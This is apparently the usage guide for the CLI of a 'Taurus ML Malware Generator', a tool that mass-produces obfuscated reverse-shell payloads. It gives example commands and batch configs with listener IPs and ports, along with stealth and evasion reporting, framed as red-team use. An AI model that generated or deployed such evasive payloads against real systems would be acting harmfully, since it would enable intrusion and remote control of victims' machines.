# Taurus CLI Improvements - Usage Guide

## 🎯 Overview

This guide covers the new CLI commands and utilities added to the Taurus ML Malware Generator.

## 📦 New Features

### 1. Payload Analysis Command

Analyze any payload file to get detailed information about its characteristics.

```bash
python cli.py analyze --payload payload.exe --output analysis.json
```

**Features:**
- File size and type detection
- Entropy calculation
- Multiple hash algorithms (MD5, SHA1, SHA256)
- Suspicious indicator detection
- Optional JSON output

**Example Output:**
```
┏━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Property      ┃ Value                  ┃
┡━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━┩
│ Size          │ 12,345 bytes           │
│ Entropy       │ 7.2345                 │
│ File Type     │ PE/EXE                 │
│ MD5           │ abc123...              │
│ SHA256        │ def456...              │
└───────────────┴────────────────────────┘
```

---

### 2. Configuration Profiles

Save and reuse payload generation configurations.

#### Save a Profile

```bash
# Interactive mode
python cli.py save-profile --name myprofile

# With parameters
python cli.py save-profile \
  --name myprofile \
  --type reverse_shell \
  --target windows \
  --obfuscation-level 5
```

#### List Profiles

```bash
python cli.py list-profiles
```

#### Use a Profile

```bash
python cli.py use-profile \
  --name myprofile \
  --lhost 192.168.1.10 \
  --lport 4444 \
  --output payload.exe
```

**Benefits:**
- Reuse common configurations
- Consistent payload generation
- Quick deployment for different targets
- Team collaboration

---

### 3. HTML Report Generation

Generate professional HTML reports for payload analysis.

```bash
python cli.py report \
  --payload payload.exe \
  --metadata metadata.json \
  --output report.html
```

**Report Includes:**
- Payload information (size, type, target)
- Techniques applied (obfuscation, evasion)
- Detection analysis with stealth scores
- Functionality test results
- Hash values for verification

**Example Report Sections:**
- 📦 Payload Information
- 🎭 Techniques Applied
- 🔍 Detection Analysis
- ✅ Functionality Tests
- 📊 Hashes

---

### 4. Batch Processing

Generate multiple payload variants from a configuration file.

#### Create Configuration File

Create `batch_config.json`:

```json
[
  {
    "lhost": "192.168.1.10",
    "lport": 4444,
    "target_os": "windows",
    "obfuscate": true,
    "obfuscation_level": 3
  },
  {
    "lhost": "192.168.1.10",
    "lport": 4445,
    "target_os": "linux",
    "obfuscate": true,
    "obfuscation_level": 5
  },
  {
    "lhost": "192.168.1.10",
    "lport": 4446,
    "target_os": "windows",
    "obfuscate": true,
    "obfuscation_level": 4
  }
]
```

#### Run Batch Processing

```bash
python cli.py batch-from-config \
  --config batch_config.json \
  --output-dir batch_output
```

**Output:**
- Individual payload files
- Metadata for each payload
- `batch_results.json` with summary
- Success/failure statistics

---

## 🔧 Utility Classes

### PayloadAnalyzer

```python
from utils.helpers import get_analyzer

analyzer = get_analyzer()
analysis = analyzer.analyze_payload(payload_bytes)

print(f"Entropy: {analysis['entropy']}")
print(f"File Type: {analysis['file_type']}")
print(f"SHA256: {analysis['sha256']}")
```

### ConfigManager

```python
from utils.helpers import get_config_manager

manager = get_config_manager()

# Save configuration
config = {
    'payload_type': 'reverse_shell',
    'target_os': 'windows',
    'obfuscation_level': 5
}
manager.save_profile('my_config', config)

# Load configuration
loaded = manager.load_profile('my_config')

# List all profiles
profiles = manager.list_profiles()
```

### ReportGenerator

```python
from utils.helpers import get_report_generator

generator = get_report_generator()

generator.generate_html_report(
    payload_info={...},
    detection_results={...},
    functionality_results={...},
    output_path='report.html'
)
```

### BatchProcessor

```python
from utils.helpers import get_batch_processor

processor = get_batch_processor()

configs = [
    {'lhost': '192.168.1.10', 'lport': 4444, ...},
    {'lhost': '192.168.1.10', 'lport': 4445, ...},
]

results = processor.process_batch(configs, 'output_dir')
```

---

## 📊 Complete Workflow Example

### Scenario: Generate Multiple Payloads for Red Team Exercise

#### Step 1: Create a Profile

```bash
python cli.py save-profile \
  --name redteam_windows \
  --type reverse_shell \
  --target windows \
  --obfuscation-level 5
```

#### Step 2: Generate Initial Payload

```bash
python cli.py use-profile \
  --name redteam_windows \
  --lhost 192.168.1.100 \
  --lport 443 \
  --output payload_v1.exe
```

#### Step 3: Analyze the Payload

```bash
python cli.py analyze \
  --payload payload_v1.exe \
  --output analysis_v1.json
```

#### Step 4: Generate Report

```bash
python cli.py report \
  --payload payload_v1.exe \
  --metadata payload_v1_metadata.json \
  --output report_v1.html
```

#### Step 5: Batch Generate Variants

```bash
python cli.py batch-from-config \
  --config team_configs.json \
  --output-dir team_payloads
```

---

## 🎓 Best Practices

### 1. Profile Management

- Create profiles for common scenarios
- Use descriptive names (e.g., `windows_high_obf`, `linux_stealth`)
- Document profile purposes in a README
- Share profiles with team members

### 2. Batch Processing

- Test configurations individually first
- Use incremental port numbers for multiple listeners
- Monitor batch results for failures
- Keep configuration files in version control

### 3. Analysis and Reporting

- Always analyze payloads before deployment
- Generate reports for documentation
- Compare entropy across variants
- Track hash values for payload management

### 4. Security

- Store profiles securely
- Don't commit sensitive configurations to git
- Use environment variables for sensitive data
- Rotate configurations regularly

---

## 🔍 Troubleshooting

### Import Errors

If you encounter import errors:

```bash
# Verify all dependencies
pip install -r requirements.txt

# Test imports
python test_cli_improvements.py
```

### Profile Not Found

```bash
# List available profiles
python cli.py list-profiles

# Check profile directory
ls config/profiles/
```

### Batch Processing Failures

- Check configuration file format (valid JSON)
- Verify all required fields are present
- Test with a single configuration first
- Review `batch_results.json` for error details

---

## 📚 Additional Resources

- **Main README**: `README_ENHANCED.md`
- **Integration Guide**: `INTEGRATION_GUIDE.md`
- **Advanced Examples**: `examples/advanced_example.py`
- **Test Suite**: `test_cli_improvements.py`
- **API Documentation**: See docstrings in `utils/helpers.py`

---

## 🚀 Quick Reference

| Command | Purpose |
|---------|---------|
| `analyze` | Analyze payload characteristics |
| `save-profile` | Save configuration profile |
| `list-profiles` | List all saved profiles |
| `use-profile` | Generate payload from profile |
| `report` | Generate HTML report |
| `batch-from-config` | Batch process payloads |

---

## ⚠️ Important Notes

1. **Authorization Required**: Only use on systems you own or have explicit permission to test
2. **Legal Compliance**: Ensure compliance with local laws and regulations
3. **Ethical Use**: Follow responsible disclosure practices
4. **Safety Controls**: All safety features remain active

---

## 📞 Support

For issues or questions:
1. Run `test_cli_improvements.py` to verify installation
2. Check `COMPLETION_SUMMARY.md` for feature status
3. Review example code in `examples/` directory
4. Consult `INTEGRATION_GUIDE.md` for setup help

---

**Version**: 1.0.0  
**Last Updated**: 2025-11-25  
**Status**: ✅ Production Ready
